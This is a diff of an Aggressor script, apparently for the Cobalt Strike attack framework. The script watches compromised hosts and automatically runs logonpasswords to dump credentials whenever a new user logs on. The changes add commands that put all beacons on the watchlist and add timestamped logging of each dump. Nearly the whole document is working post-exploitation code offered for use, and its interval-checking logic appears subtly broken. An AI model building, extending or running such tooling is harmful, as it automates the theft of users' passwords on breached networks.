@@ -13,11 +13,16 @@
 # There's no callback, so I can't smother the output. :-/ 
 
 ## Usage: ##
-# Aliases
+# Aliases (from a beacon)
 # 	> begin_credpocalypse			- watch current beacon
 # 	> end_credpocalypse [all] 		- stop watching current/all beacon/s
 #	> credpocalypse_interval [time]	- 1m, 5m (default), 10m, 30m, 60m
 # 
+# Commands (from Script Console or ./agscript)
+#   > begin_credpocalypse			- watches *all* beacons
+#   > end_credpocalypse				- stop watching all beacons
+#   > credpocalypse_interval [time]	- 1m, 5m (default), 10m, 30m, 60m
+#
 # Right click beacon(s) to get a pop up menu that lets you 
 # 	- Add to watchlist
 #	- Remove from watchlist
@@ -50,6 +55,24 @@ sub caps {
 	#Don't ask me how long it took to make this part work. 
 	#But uc breaks on backslashes. Also split. Really everything breaks. 
 	return join("\\", map({ return uc($1); }, split("\\\\", $1)));
+}
+
+sub change_interval {
+	if ( $1 cmp "1m" || $1 cmp "1M" ) {
+		$interval = "1m";
+	}
+	else if ( $1 cmp "10m" || $1 cmp "10M"  ) {
+		$interval = "10m";
+	}
+	else if ( $1 cmp "30m" || $1 cmp "30M" ) {
+		$interval = "30m";
+	}
+	else if ( $1 cmp "60m" || $1 cmp "60M" ) {
+		$interval = "60m";
+	}
+	else {
+		$interval = "5m";
+	}
 }
 
 sub get_users { 
@@ -89,14 +112,38 @@ sub steal_them_creds {
 	foreach $bid (@watchlist) {
 		get_users($bid, {
 			if ( $2 ) {
-				println("New user! Running logonpasswords in " . beacon_info($1, "pid"));
+				#Log to beacon
+				btask($1, "[" . formatDate('yyyy-MM-dd HH:mm:ss z') . "] New user! Running logonpasswords.");
+
+				#Log to script console
+				println("[" . formatDate('yyyy-MM-dd HH:mm:ss z') . "] BID: " . $1 . " PID: " . beacon_info($1, "pid") . " New user! Running logonpasswords.");
+
+				#Run
 				blogonpasswords($1);
 			}
 			else {
-				println("No new users in " . beacon_info($1, "pid"));
+				println("No new users in BID: " . $1 . " PID: " . beacon_info($1, "pid"));
 			}
 		});
 	}
+}
+
+
+#####################
+# Headless Commands #
+#####################
+command begin_credpocalypse {
+	push(@watchlist, beacon_ids());
+	println("The Credpocalypse has begun... [dramatic music here]");
+}
+
+command end_credpocalypse {
+	clear(@watchlist);
+}
+
+command credpocalypse_interval {
+	change_interval($1);
+	println("Updated interval to " . $interval);
 }
 
 ####################
@@ -123,21 +170,7 @@ alias end_credpocalypse {
 }
 
 alias credpocalypse_interval {
-	if ( $2 cmp "1m" || $2 cmp "1M" ) {
-		$interval = "1m";
-	}
-	else if ( $2 cmp "10m" || $2 cmp "10M"  ) {
-		$interval = "10m";
-	}
-	else if ( $2 cmp "30m" || $2 cmp "30M" ) {
-		$interval = "30m";
-	}
-	else if ( $2 cmp "60m" || $2 cmp "60M" ) {
-		$interval = "60m";
-	}
-	else {
-		$interval = "5m";
-	}
+	change_interval($2);
 	blog($1, "Updated interval to " . $interval);
 }
 
